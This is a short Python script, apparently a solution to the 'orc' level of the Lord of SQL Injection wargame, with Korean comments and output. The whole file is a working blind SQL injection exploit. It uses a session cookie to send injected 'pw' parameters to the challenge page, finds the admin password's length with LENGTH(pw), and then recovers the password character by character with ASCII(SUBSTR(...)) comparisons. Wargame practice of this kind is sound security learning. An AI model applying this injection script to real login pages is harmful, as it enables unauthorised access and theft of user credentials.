# -*- coding : UTF-8 -*-
from requests import get
import string

print("#### Lord of SQL Injection ####\n")

# setting URL
url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"

#Setting Cookies. You must set YOUR COOKIE!!
cookies = dict(PHPSESSID="irol41srevag2a8osqleail8f2")      
abc = string.digits + string.ascii_letters                  #Storing ascii letters
result = ""

#Guessing the length of id
for i in range(1,20):
    param = "?pw=1' or id='admin' and LENGTH(pw)=" + str(i) + "%23"
    new_url = url + param
    r = get(new_url, cookies=cookies)

    if r.text.find("<h2>Hello admin</h2>") > 0:
        idLength = i + 1
        print("pw의 길이는 " + str(i) + " 입니다.")
        break


#Starting Blind SQL Injection
print("\n\n#### Starting Blind SQL Injection ####\n")
for i in range(1, idLength):
    for a in abc:
        param = "?pw=1' or id='admin' and ASCII(SUBSTR(pw, " + str(i) + ", 1))=" + str(ord(a)) + "%23"
        new_url = url + param
        r = get(new_url, cookies=cookies)

        if r.text.find("<h2>Hello admin</h2>") > 0:
            print(str(i) + "번 째 pw의 값은 '" + a + "' 입니다. ")
            result += a
            break

    if i == 1 and result == "":
        print("FAIL")
        exit(0)

    if i == idLength-1:
        print("\n\n#### RESULT ####")
        print("pw : " + result)
